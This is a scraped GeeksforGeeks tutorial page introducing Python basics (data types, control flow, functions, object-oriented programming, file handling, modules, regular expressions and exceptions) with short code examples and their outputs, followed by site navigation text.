quotes or double quotes or even triple quotes. # Python Program for # Creation of String # String with single quotes print('Welcome to the Geeks World') # String with double quotes print("I'm a Geek") # String with triple quotes print('''I'm a Geek and I live in a world of "Geeks"''') Output: Welcome to the Geeks World I'm a Geek I'm a Geek and I live in a world of "Geeks" Accessing elements of string – # Python Program to Access # characters of String String1 = "GeeksForGeeks" # Printing First character print(String1[0]) # Printing Last character print(String1[-1]) Output: G s Deleting/Updating from a String – In Python, Updation or deletion of characters from a String is not allowed because Strings are immutable. Only new strings can be reassigned to the same name. # Python Program to Update / delete # character of a String String1 = "Hello, I'm a Geek" # Updating a character String1[2] = 'p' # Deleting a character del String1[2] Output: Traceback (most recent call last): File “/home/360bb1830c83a918fc78aa8979195653.py”, line 6, in String1[2] = ‘p’ TypeError: ‘str’ object does not support item assignment Traceback (most recent call last): File “/home/499e96a61e19944e7e45b7a6e1276742.py”, line 8, in del String1[2] TypeError: ‘str’ object doesn’t support item deletion Note: For more information, refer 👉🏽 Python String. Refer to the below articles to know more about Strings: String Slicing in Python Python String Concatenation Python String Interpolation Python programming questions on String 2) List: Lists are just like the arrays, declared in other languages. A single list may contain DataTypes like Integers, Strings, as well as Objects. The elements in a list are indexed according to a definite sequence and the indexing of a list is done with 0 being the first index. It is represented by list class. # Python program to demonstrate # Creation of List # Creating a List List = [] print(List) # Creating a list of strings List = ['GeeksForGeeks', 'Geeks'] print(List) # Creating a Multi-Dimensional List List = [['Geeks', 'For'], ['Geeks']] print(List) Output: [] ['GeeksForGeeks', 'Geeks'] [['Geeks', 'For'], ['Geeks']] Adding Elements to a List: Using append(), insert() and extend() # Python program to demonstrate # Addition of elements in a List # Creating a List List = [] # Using append() List.append(1) List.append(2) print(List) # Using insert() List.insert(3, 12) List.insert(0, 'Geeks') print(List) # Using extend() List.extend([8, 'Geeks', 'Always']) print(List) Output: [1, 2] ['Geeks', 1, 2, 12] ['Geeks', 1, 2, 12, 8, 'Geeks', 'Always'] Accessing elements from the List – Use the index operator [ ] to access an item in a list. In Python, negative sequence indexes represent positions from the end of the array. Instead of having to compute the offset as in List[len(List)-3], it is enough to just write List[-3]. # Python program to demonstrate # accessing of element from list List = [1, 2, 3, 4, 5, 6] # accessing a element print(List[0]) print(List[2]) # Negative indexing # print the last element of list print(List[-1]) # print the third last element of list print(List[-3]) Output: 1 3 6 4 Removing Elements from the List: Using remove() and pop() # Python program to demonstrate # Removal of elements in a List # Creating a List List = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12] # using Remove() method List.remove(5) List.remove(6) print(List) # using pop() List.pop() print(List) Output: [1, 2, 3, 4, 7, 8, 9, 10, 11, 12] [1, 2, 3, 4, 7, 8, 9, 10, 11] Note: For more information, refer 👉🏽 Python List. Refer to the below articles to know more about List: Iterate over a list in Python Python List Comprehension and Slicing Python programming questions on List 3) Tuple: Tuple is an ordered collection of Python objects much like a list. The important difference between a list and a tuple is that tuples are immutable. It is represented by tuple class. In Python, tuples are created by placing a sequence of values separated by ‘comma’ with or without the use of parentheses for grouping of the data sequence. # Python program to demonstrate # creation of Set # Creating an empty tuple Tuple1 = () print (Tuple1) # Creating a tuple of strings print(('Geeks', 'For')) # Creating a Tuple of list print(tuple([1, 2, 4, 5, 6])) # Creating a nested Tuple Tuple1 = (0, 1, 2, 3) Tuple2 = ('python', 'geek') Tuple3 = (Tuple1, Tuple2) print(Tuple3) Output: () ('Geeks', 'For') (1, 2, 4, 5, 6) ((0, 1, 2, 3), ('python', 'geek')) Accessing element of a tuple – Use the index operator [ ] to access an item in a tuple. # Python program to # demonstrate accessing tuple tuple1 = tuple([1, 2, 3, 4, 5]) # Accessing element using indexing print(tuple1[0]) # Accessing element using Negative # Indexing print(tuple1[-1]) Output: 1 5 Deleting/updating elements of tuple – Items of a tuple cannot be deleted as tuples are immutable in Python. Only new tuples can be reassigned to the same name. # Python program to # demonstrate updation / deletion # from a tuple tuple1 = tuple([1, 2, 3, 4, 5]) # Updating an element tuple1[0] = -1 # Deleting an element del tuple1[2] Output: Traceback (most recent call last): File "/home/084519a8889e9b0103b874bbbb93e1fb.py", line 11, in tuple1[0] = -1 TypeError: 'tuple' object does not support item assignment Traceback (most recent call last): File "/home/ffb3f8be85dd393bde5d0483ff191343.py", line 12, in del tuple1[2] TypeError: 'tuple' object doesn't support item deletion Note: For more information, refer 👉🏽 Python Tuples. Refer to the below articles to know more about tuples: Unpacking a Tuple in Python Operations on Tuples Python programming questions on Tuples Boolean Booleans are data type with one of the two built-in values, True or False. It is denoted by the class bool. # Python program to # demonstrate boolean type print(type(True)) print(1>2) print('a'=='a') Output: <class 'bool'> False True Set In Python, Set is an unordered collection of data type that is iterable, mutable and has no duplicate elements. The order of elements in a set is undefined though it may consist of various elements. Sets can be created by using the built-in set() function with an iterable object or a sequence by placing the sequence inside curly braces {}, separated by ‘comma’. # Python program to demonstrate # Creation of Set in Python # Creating a Set set1 = set() # Creating a Set of String set1 = set("GeeksForGeeks") print(set1) # Creating a Set of List set1 = set(["Geeks", "For", "Geeks"]) print(set1) Output: {'o', 'r', 'k', 'G', 'e', 's', 'F'} {'Geeks', 'For'} Adding elements: Using add() and update() # Python program to demonstrate # Addition of elements in a Set set1 = set() # Adding to the Set using add() set1.add(8) set1.add((6, 7)) print(set1) # Additio to the Set using Update() set1.update([10, 11]) print(set1) Output: {8, (6, 7)} {8, 10, 11, (6, 7)} Accessing a Set: One can loop through the set items using a for loop as set items cannot be accessed by referring to an index. # Python program to demonstrate # Accessing of elements in a set # Creating a set set1 = set(["Geeks", "For", "Geeks"]) # Accessing using for loop for i in set1: print(i, end =" ") Output: Geeks For Removing elements from a set: Using remove(), discard(), pop() and clear() # Python program to demonstrate # Deletion of elements in a Set set1 = set([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]) # using Remove() method set1.remove(5) set1.remove(6) print(set1) # using Discard() method set1.discard(8) set1.discard(9) print(set1) # Set using the pop() method set1.pop() print(set1) # Set using clear() method set1.clear() print(set1) Output: {1, 2, 3, 4, 7, 8, 9, 10, 11, 12} {1, 2, 3, 4, 7, 10, 11, 12} {2, 3, 4, 7, 10, 11, 12} set() Note: For more information, refer 👉🏽 Python Sets. Refer to the below articles to know more about Sets: Iterate over a set in Python frozenset() in Python Python programming questions on Sets Dictionary Dictionary in Python is an unordered collection of data values, used to store data values like a map. Dictionary holds key:value pair. Each key-value pair in a Dictionary is separated by a colon :, whereas each key is separated by a ‘comma’. A Dictionary can be created by placing a sequence of elements within curly {} braces, separated by ‘comma’. # Creating an empty Dictionary Dict = {} print(Dict) # with Integer Keys Dict = {1: 'Geeks', 2: 'For', 3: 'Geeks'} print(Dict) # with Mixed keys Dict = {'Name': 'Geeks', 1: [1, 2, 3, 4]} print(Dict) Output: {} {1: 'Geeks', 2: 'For', 3: 'Geeks'} {1: [1, 2, 3, 4], 'Name': 'Geeks'} Nested Dictionary: # Creating a Nested Dictionary # as shown in the below image Dict = {1: 'Geeks', 2: 'For', 3:{'A' : 'Welcome', 'B' : 'To', 'C' : 'Geeks'}} print(Dict) Output: {1: 'Geeks', 2: 'For', 3: {'A': 'Welcome', 'B': 'To', 'C': 'Geeks'}} Note: For more information, refer 👉🏽 Python Nested Dictionary. Adding elements to a Dictionary: One value at a time can be added to a Dictionary by defining value along with the key e.g. Dict[Key] = ‘Value’. # Creating an empty Dictionary Dict = {} # Adding elements one at a time Dict[0] = 'Geeks' Dict[2] = 'For' Dict[3] = 1 print(Dict) # Updating existing Key's Value Dict[2] = 'Welcome' print(Dict) Output: {0: 'Geeks', 2: 'For', 3: 1} {0: 'Geeks', 2: 'Welcome', 3: 1} Accessing elements from a Dictionary: In order to access the items of a dictionary refer to its key name or use get() method. # Python program to demonstrate # accessing an element from a Dictionary # Creating a Dictionary Dict = {1: 'Geeks', 'name': 'For', 3: 'Geeks'} # accessing a element using key print(Dict['name']) # accessing a element using get() print(Dict.get(3)) Output: For Geeks Removing Elements from Dictionary: Using pop() and popitem() # Initial Dictionary Dict = { 5 : 'Welcome', 6 : 'To', 7 : 'Geeks', 'A' : {1 : 'Geeks', 2 : 'For', 3 : 'Geeks'}, } # using pop() Dict.pop(5) print(Dict) # using popitem() Dict.popitem() print(Dict) Output: {'A': {1: 'Geeks', 2: 'For', 3: 'Geeks'}, 6: 'To', 7: 'Geeks'} {6: 'To', 7: 'Geeks'} Note: For more information, refer 👉🏽 Python Dictionary. Refer to the below articles to know more about dictionary: Operations on Dictionary Iterate over a dictionary in Python Python programming questions on dictionary Decision Making Decision Making in programming is similar to decision making in real life. A programming language uses control statements to control the flow of execution of the program based on certain conditions. These are used to cause the flow of execution to advance and branch based on changes to the state of a program. Decision-making statements in Python if statement if..else statements nested if statements if-elif ladder Example 1: To demonstrate if and if-else # Python program to demonstrate # decision making a = 10 b = 15 # if to check even number if a % 2 == 0: print("Even Number") # if-else to check even or odd if b % 2 == 0: print("Even Number") else: print("Odd Number") Output: Even Number Odd Number Example 2: To demonstrate nested-if and if-elif # Python program to demonstrate # decision making a = 10 # Nested if to check whether a # number is divisible by both 2 and 5 if a % 2 == 0: if a % 5 == 0: print("Number is divisible by both 2 and 5") # is-elif if (a == 11): print ("a is 11") elif (a == 10): print ("a is 10") else: print ("a is not present") Output: Number is divisible by both 2 and 5 a is 10 Note: For more information, refer 👉🏽 Decision Making in Python. Control flow (Loops) Loops in programming come into use when we need to repeatedly execute a block of statements. For example: Suppose we want to print “Hello World” 10 times. This can be done with the help of loops. The loops in Python are: While and while-else loop # Python program to illustrate # while and while-else loop i = 0 while (i < 3): i = i + 1 print("Hello Geek") # checks if list still # contains any element a = [1, 2, 3, 4] while a: print(a.pop()) i = 10 while i < 12: i += 1 print(i) break else: # Not executed as there is a break print("No Break") Output: Hello Geek Hello Geek Hello Geek 4 3 2 1 11 Note: For more information, refer 👉🏽 Python While Loops. For and for-else loop # Python program to illustrate # Iterating over a list print("List Iteration") l = ["geeks", "for", "geeks"] for i in l: print(i) # Iterating over a String print("\nString Iteration") s = "Geeks" for i in s : print(i) print("\nFor-else loop") for i in s: print(i) else: # Executed because no break in for print("No Break\n") for i in s: print(i) break else: # Not executed as there is a break print("No Break") Output: List Iteration geeks for geeks String Iteration G e e k s For-else loop G e e k s No Break G Note: For more information, refer 👉🏽 Python For Loops. range() function: range() allows user to generate a series of numbers within a given range. Depending on how many arguments user is passing to the function. This function takes three arguments. 1) start: integer starting from which the sequence of integers is to be returned 2) stop: integer before which the sequence of integers is to be returned. 3) step: integer value which determines the increment between each integer in the sequence filter_none # Python program to demonstrate # range() function for i in range(5): print(i, end =" ") print() for i in range(2, 9): print(i, end =" ") print() # incremented by 3 for i in range(15, 25, 3): print(i, end =" ") Output: 0 1 2 3 4 2 3 4 5 6 7 8 15 18 21 24 Note: For more information, refer 👉🏽 Python range() function. Refer to the below articles to know more about Loops: Understanding for-loop in Python Backward iteration in Python Loop control statements Loop control statements change execution from its normal sequence. Following are the loop control statements provided by Python: Break: Break statement in Python is used to bring the control out of the loop when some external condition is triggered. Continue: Continue statement is opposite to that of break statement, instead of terminating the loop, it forces to execute the next iteration of the loop. Pass: Pass statement is used to write empty loops. Pass is also used for empty control statement, function and classes. # Python program to demonstrate # break, continue and pass s = 'geeksforgeeks' for letter in s: if letter == 'e' or letter == 's': break print(letter, end = " ") print() for letter in s: if letter == 'e' or letter == 's': continue print(letter, end = " ") print() for letter in s: if letter == 'e' or letter == 's': pass print(letter, end = " ") Output: g g k f o r g k g e e k s f o r g e e k s Note: For more information, refer 👉🏽 break, continue and pass in Python. Functions Functions are generally the block of codes or statements in a program that gives the user the ability to reuse the same code which ultimately saves the excessive use of memory, acts as a time saver and more importantly, provides better readability of the code. So basically, a function is a collection of statements that perform some specific task and return the result to the caller. A function can also perform some specific task without returning anything. In Python, def keyword is used to create functions. # Python program to demonstrate # functions # Defining functions def ask_user(): print("Hello Geeks") # Function that returns sum # of first 10 numbers def my_func(): a = 0 for i in range(1, 11): a = a + i return a # Calling functions ask_user() res = my_func() print(res) Output: Hello Geeks 55 Function with arguments Default arguments: A default argument is a parameter that assumes a default value if a value is not provided in the function call for that argument. # Python program to demonstrate # default arguments def myFun(x, y = 50): print("x: ", x) print("y: ", y) # Driver code myFun(10) Output: ('x: ', 10) ('y: ', 50) Keyword arguments: The idea is to allow caller to specify argument name with values so that caller does not need to remember order of parameters. # Python program to demonstrate Keyword Arguments def student(firstname, lastname): print(firstname, lastname) # Keyword arguments student(firstname ='Geeks', lastname ='Practice') student(lastname ='Practice', firstname ='Geeks') Output: ('Geeks', 'Practice') ('Geeks', 'Practice') Variable length arguments: In Python a function can also have variable number of arguments. This can be used in the case when we do not know in advance the number of arguments that will be passed into a function. # Python program to demonstrate # variable length arguments # variable arguments def myFun1(*argv): for arg in argv: print(arg, end =" ") # variable keyword arguments def myFun2(**kwargs): for key, value in kwargs.items(): print ("% s == % s" %(key, value)) # Driver code myFun1('Hello', 'Welcome', 'to', 'GeeksforGeeks') print() myFun2(first ='Geeks', mid ='for', last ='Geeks') Output: Hello Welcome to GeeksforGeeks first == Geeks last == Geeks mid == for Note: For more information, refer 👉🏽 Functions in Python. Refer to the below articles to know more about functions: Python Inner Functions Python return statement Call function from another function Lambda functions In Python, the lambda/anonymous function means that a function is without a name. The lambda keyword is used to create anonymous functions. Lambda function can have any number of arguments but has only one expression. # Python code to demonstrate # labmda function # Cube using lambda cube = lambda x: x * x*x print(cube(7)) # List comprehension using lambda a = [(lambda x: x * 2)(x) for x in range(5)] print(a) Output: 343 [0, 2, 4, 6, 8] Note: For more information, refer 👉🏽 Python lambda (Anonymous Functions). Refer to the below articles to know more about Lambda: Python programming questions on Lambda Object Oriented Programming Object-oriented programming aims to implement real-world entities like inheritance, hiding, polymorphism, etc in programming. The main aim of OOP is to bind together the data and the functions that operate on them so that no other part of the code can access this data except that function. Classes and Objects Class creates a user-defined data structure, which holds its own data members and member functions, which can be accessed and used by creating an instance of that class. A class is like a blueprint for an object. An Object is an instance of a Class. A class is like a blueprint while an instance is a copy of the class with actual values. # Python program to demonstrate # classes and objects class Dog: # A simple class attribute attr1 = "mamal" attr2 = "dog" # A sample method def fun(self): print("I'm a", self.attr1) print("I'm a", self.attr2) # Driver code # Object instantiation Rodger = Dog() # Accessing class attributes # and method through objects print(Rodger.attr1) Rodger.fun() Output: mamal I'm a mamal I'm a dog Note: For more information, refer 👉🏽 Python Classes and Objects. The self self represents the instance of the class. By using the “self” keyword we can access the attributes and methods of the class in python. It binds the attributes with the given arguments. Note: For more information, refer 👉🏽 self in Python class. Constructors and Destructors Constructors: Constructors are generally used for instantiating an object.The task of constructors is to initialize(assign values) to the data members of the class when an object of class is created. In Python the __init__() method is called the constructor and is always called when an object is created. There can be two types of constructors: Default constructor: The constructor which is called implicilty and do not accept any argument. Parameterized constructor:Constructor which is called explicitly with parameters is known as parameterized constructor. # Python program to demonstrate # constructors class Addition: # parameterized constructor def __init__(self, f, s): self.first = f self.second = s def calculate(self): print(self.first + self.second) # Invoking parameterized constructor obj = Addition(1000, 2000) # perform Addition obj.calculate() Output: 3000 Note: For more information, refer 👉🏽 Constructors in Python. Destructors: Destructors are called when an object gets destroyed. The __del__() method is a known as a destructor method in Python. It is called when all references to the object have been deleted i.e when an object is garbage collected. # Python program to illustrate destructor class Employee: # Initializing def __init__(self): print('Employee created.') # Deleting (Calling destructor) def __del__(self): print('Destructor called, Employee deleted.') obj = Employee() del obj Output: Employee created. Destructor called, Employee deleted. Note: For more information, refer 👉🏽 Destructors in Python. Inheritance Inheritance is the ability of any class to extract and use features of other classes. It is the process by which new classes called the derived classes are created from existing classes called Base classes. # A Python program to demonstrate inheritance class Person(): # Constructor def __init__(self, name): self.name = name # To get name def getName(self): return self.name # To check if this person is employee def isEmployee(self): return False # Inherited or Sub class (Note Person in bracket) class Employee(Person): # Here we return true def isEmployee(self): return True # Driver code emp = Person("Geek1") # An Object of Person print(emp.getName(), emp.isEmployee()) emp = Employee("Geek2") # An Object of Employee print(emp.getName(), emp.isEmployee()) Output: Geek1 False Geek2 True Note: For more information, refer 👉🏽 Python inheritance. Encapsulation Encapsulation describes the idea of wrapping data and the methods that work on data within one unit. This puts restrictions on accessing variables and methods directly and can prevent the accidental modification of data. # Python program to demonstrate # encapsulation # Creating a Base class class Base: def __init__(self): self.a = "GeeksforGeeks" self.__c = "GeeksforGeeks" # Creating a derived class class Derived(Base): def __init__(self): # Calling constructor of # Base class Base.__init__(self) print("Calling private member of base class: ") print(self.__a) # Driver code obj = Derived() Output: Traceback (most recent call last): File "/home/5a605c59b5b88751d2b93dd5f932dbd5.py", line 20, in obj = Derived() File "/home/5a605c59b5b88751d2b93dd5f932dbd5.py", line 18, in __init__ print(self.__a) AttributeError: 'Derived' object has no attribute '_Derived__a' Note: For more information, refer 👉🏽 Encapsulation in Python. Polymorphism Polymorphism refers to the ability of OOPs programming languages to differentiate between entities with the same name efficiently. This is done by Python with the help of the signature of these entities. # Python program to demonstrate # Polymorphism class A(): def show(self): print("Inside A") class B(): def show(self): print("Inside B") # Driver's code a = A() a.show() b = B() b.show() Output: Inside A Inside B Refer to the articles to know more about OOPS: Bound, unbound, and static methods in Python Multiple inheritance in Python __new__ in Python File Handling File handling is the ability of Python to handle files i.e. to read and write files along with many other file handling options. Python treats files differently as text or binary and this is important. Each line of code includes a sequence of characters and they form a text file. Each line of a file is terminated with a special character, called the EOL or End of Line characters like comma {, } or newline character. Basic File Handling operations in Python are: 1) Open a file: Opening a file refers to getting the file ready either for reading or for writing. This can be done using the open() function. This function returns a file object and takes two arguments, one that accepts the file name and another that accepts the mode(Access Mode). Python provides six Access Modes: Access Mode Description Read Only (‘r’) Open text file for reading. The handle is positioned at the beginning of the file. Read and Write (‘r+’) Open the file for reading and writing. The handle is positioned at the beginning of the file. Write Only (‘w’) Open the file for writing. For existing file, the data is truncated and over-written. The handle is positioned at the beginning of the file. Write and Read (‘w+’) Open the file for reading and writing. For existing file, data is truncated and over-written. The handle is positioned at the beginning of the file. Append Only (‘a’) Open the file for writing. The handle is positioned at the end of the file. Append and Read (‘a+’) Open the file for reading and writing. The handle is positioned at the end of the file. # Open function to open the file "MyFile1.txt" # (same directory) in read mode and file1 = open("MyFile.txt", "r") # store its reference in the variable file1 # and "MyFile2.txt" in D:\Text in file2 file2 = open(r"D:\Text\MyFile2.txt", "r+") Note: For more information, refer 👉🏽 Open a File in Python. 2) Close the file: close() function closes the file and frees the memory space acquired by that file. # Opening and Closing a file "MyFile.txt" # for object name file1. file1 = open("MyFile.txt", "a") file1.close() 3) Reading from a File: There are three ways to read data from a text file. read(): Returns the read bytes in form of a string. Reads n bytes, if no n specified, reads the entire file. File_object.read([n]) readline(): Reads a line of the file and returns in form of a string.For specified n, reads at most n bytes. However, does not reads more than one line, even if n exceeds the length of the line. File_object.readline([n]) readlines(): Reads all the lines and return them as each line a string element in a list. File_object.readlines() Let’s suppose the file looks like this: # Program to show various ways to # read data from a file. file1 = open("data.txt", "r+") print("Output of Read function is ") print(file1.read()) print() # seek(n) takes the file handle to the nth # bite from the beginning. file1.seek(0) print("Output of Readline function is ") print(file1.readline()) print() file1.seek(0) # readlines function print("Output of Readlines function is ") print(file1.readlines()) print() file1.close() Output: Output of Read function is Code is like humor. When you have to explain it, its bad. Output of Readline function is Code is like humor. When you have to explain it, its bad. Output of Readlines function is ['Code is like humor. When you have to explain it, its bad.'] Note: For more information, refer 👉🏽 How to read from a file in Python. 4) Writing to a file: There are two ways to write in a file. write(): Inserts the string str1 in a single line in the text file. File_object.write(str1) writelines(): For a list of string elements, each string is inserted in the text file. Used to insert multiple strings at a single time. File_object.writelines(L) for L = [str1, str2, str3] # Python program to demonstrate # writing to file # Opening a file file1 = open('myfile.txt', 'w') L = ["This is Delhi \n", "This is Paris \n", "This is London \n"] s = "Hello\n" # Writing a string to file file1.write(s) # Writing multiple strings # at a time file1.writelines(L) # Closing file file1.close() Output: Note: For more information, refer 👉🏽 Writing to file in Python. Refer to the below articles to know more about File-Handling: Python seek() function Python tell() function OS Module in Python Programs on OS module Modules and Packages Modules A module is a self-contained Python file that contains Python statements and definitions, like a file named GFG.py, which can be considered as a module named GFG which can be imported with the help of import statement. Let’s create a simple module named GFG. # Python program to demonstrate # modules # Defining a function def Geeks(): print("GeeksforGeeks") # Defining a variable location = "Noida" # Defining a class class Employee(): def __init__(self, name, position): self. name = name self.position = position def show(self): print("Employee name:", self.name) print("Employee position:", self.position) To use the above created module, create a new Python file in the same directory and import GFG module using the import statement. # Python program to demonstrate # modules import GFG # Use the function created GFG.Geeks() # Print the variable declared print(GFG.location) # Use the class created emp = GFG.Employee("Nikhil", "Developer") emp.show() Output: GeeksforGeeks Noida Employee name: Nikhil Employee position: Developer Note: For more information, refer 👉🏽 Python Modules. Packages Packages are a way of structuring many packages and modules which helps in a well-organized hierarchy of data set, making the directories and modules easy to access. To create a package in Python, we need to follow these three simple steps: First, we create a directory and give it a package name, preferably related to its operation. Then we put the classes and the required functions in it. Finally we create an __init__.py file inside the directory, to let Python know that the directory is a package. Example: Let’s create a package for cars. First we create a directory and name it Cars. Then we need to create modules. We will create 2 modules – BMW and AUDI. For Bmw.py # Python code to illustrate the Modules class Bmw: def __init__(self): self.models = ['i8', 'x1', 'x5', 'x6'] def outModels(self): print('These are the available models for BMW') for model in self.models: print('\t % s ' % model) For Audi.py # Python code to illustrate the Module class Audi: def __init__(self): self.models = ['q7', 'a6', 'a8', 'a3'] def outModels(self): print('These are the available models for Audi') for model in self.models: print('\t % s ' % model) Finally we create the __init__.py file. This file will be placed inside the Cars directory and can be left blank. Now, let’s use the package that we created. To do this make a sample.py file in the same directory where Cars package is located and add the following code to it: # Import classes from your brand new package from Cars import Bmw from Cars import Audi # Create an object of Bmw class & call its method ModBMW = Bmw() ModBMW.outModels() # Create an object of Audi class & call its method ModAudi = Audi() ModAudi.outModels() Output: Note: For more information, refer 👉🏽 Create and Access a Python Package. Regular expressions Module Regular Expressions(RE) specifies a set of strings(pattern) that matches it. To understand the RE analogy, MetaCharacters are useful, important and will be used in functions of module re. There are a total of 14 metacharacters: \ Used to drop the special meaning of character following it (discussed below) [] Represent a character class ^ Matches the beginning $ Matches the end . Matches any character except newline ? Matches zero or one occurrence. | Means OR (Matches with any of the characters separated by it. * Any number of occurrences (including 0 occurrences) + One ore more occurrences {} Indicate the number of occurrences of a preceding RE to match. () Enclose a group of REs The most frequently used methods are: re.findall(): Return all non-overlapping matches of pattern in string, as a list of strings. The string is scanned left-to-right, and matches are returned in the order found. # A Python program to demonstrate working of # findall() import re string = """Hello my Number is 123456789 and my friend's number is 987654321""" # A sample regular expression to find digits. regex = '\d+' match = re.findall(regex, string) print(match) Output: ['123456789', '987654321'] In the above example, metacharacter blackslash ‘\’ has a very important role as it signals various sequences. If the blackslash is to be used without its special meaning as metacharacter, use’\\’. \d Matches any decimal digit, this is equivalent to the set class [0-9]. \D Matches any non-digit character. \s Matches any whitespace character. \S Matches any non-whitespace character \w Matches any alphanumeric character, this is equivalent to the class [a-zA-Z0-9_]. \W Matches any non-alphanumeric character. re.compile(): Regular expressions are compiled into pattern objects, which have methods for various operations such as searching for pattern matches or performing string substitutions. # A Python program to demonstrate working of # compile() import re # it is equivalent to [abcde]. p = re.compile('[a-e]') print(p.findall("Aye, said Mr. Gibenson Stark")) Output: ['e', 'a', 'd', 'b', 'e', 'a'] re.match(): This function attempts to match pattern to whole string. The re.match function returns a match object on success, None on failure. # A Python program to demonstrate working # of re.match(). import re def findMonthAndDate(string): regex = r"([a-zA-Z]+) (\d+)" match = re.match(regex, string) if match == None: print("Not a valid date") return print("Given Data: % s" % (match.group())) print("Month: % s" % (match.group(1))) print("Day: % s" % (match.group(2))) # Driver Code findMonthAndDate("Jun 24") print("") findMonthAndDate("I was born on June 24") Output: Given Data: Jun 24 Month: Jun Day: 24 Not a valid date re.search(): This method either returns None (if the pattern doesn’t match), or a re.MatchObject that contains information about the matching part of the string. # A Python program to demonstrate working of re.match(). import re regex = r"([a-zA-Z]+) (\d+)" match = re.search(regex, "I was born on June 24") if match != None: print("Match at index % s, % s" % (match.start(), match.end())) # this will print "June 24" print("Full match: % s" % (match.group(0))) # this will print "June" print("Month: % s" % (match.group(1))) # this will print "24" print("Day: % s" % (match.group(2))) else: print("The regex pattern does not match.") Output: Match at index 14, 21 Full match: June 24 Month: June Day: 24 Note: For more information, refer 👉🏽 Regular Expression in Python. Exception handling Like other languages, Python also provides the runtime errors via exception handling method with the help of try-except. How try-except works? First try clause is executed i.e. the code between try and except clause. If there is no exception, then only try clause will run, except clause is finished. If any exception occurred, try clause will be skipped and except clause will run. If any exception occurs, but the except clause within the code doesn’t handle it, it is passed on to the outer try statements. If the exception left unhandled, then the execution stops. A try statement can have more than one except clause. Code 1: No exception, so try clause will run. # Python code to illustrate # working of try() def divide(x, y): try: result = x // y print("Yeah ! Your answer is :", result) except ZeroDivisionError: print("Sorry ! You are dividing by zero ") # Look at parameters and note the working of Program divide(3, 2) Output: Yeah ! Your answer is : 1 Code 2: There is an exception so only except clause will run. # Python code to illustrate # working of try() def divide(x, y): try: result = x // y print("Yeah ! Your answer is :", result) except: print("Sorry ! You are dividing by zero ") # Look at parameters and note the working of Program divide(3, 0) Output: Sorry ! You are dividing by zero Else Clause: In python, you can also use else clause on try-except block which must be present after all the except clauses. The code enters the else block only if the try clause does not raise an exception. # Python code to illustrate # working of try() def divide(x, y): try: result = x // y print("Yeah ! Your answer is :", result) except: print("Sorry ! You are dividing by zero ") else: print("No exception raised") # Look at parameters and note the working of Program divide(3, 2) Output: Yeah ! Your answer is : 1 No exception raised Raising Exception: The raise statement allows the programmer to force a specific exception to occur. This must be either an exception instance or an exception class. To know more about the list of exception class 👉🏽 click here. # Program to depict Raising Exception try: raise NameError("Hi there") # Raise Error except NameError: print("An exception") raise # To determine whether the exception was raised or not Output: Traceback (most recent call last): File "/home/4678cd3d633b2ddf9d19fde6283f987b.py", line 4, in raise NameError("Hi there") # Raise Error NameError: Hi there Note: For more information, refer 👉🏽 Python exception handling. Attention geek! Strengthen your foundations with the Python Programming Foundation Course and learn the basics. To begin with, your interview preparations Enhance your Data Structures concepts with the Python DS Course. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in PythonMajor Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceHow To Create a Countdown Timer Using Python?How to find index of a given element in a Vector in C++ room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Pandas Tutorial - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Using Matplotlib with Jupyter NotebookHow To Use Jupyter Notebook – An Ultimate GuidePandas TutorialPython | sympy.Pow() methodNumpy ufunc | Universal functionsIntroduction to Pandas in PythonHow to Install Python Pandas on Windows and Linux?How to install Python on Windows?Set up virtual environment for Python using AnacondaHow to setup Anaconda path to environment variable ?How to install Anaconda on windows?How to install Jupyter Notebook in Windows?How to install PIP on Windows ?Beautifulsoup Installation – PythonExpected Number of Trials until SuccessLinearity of ExpectationExpectation or expected value of an arrayRandom Walk (Implementation in Python)Page Rank Algorithm and ImplementationHyperlink Induced Topic Search (HITS) Algorithm using Networxx Module | 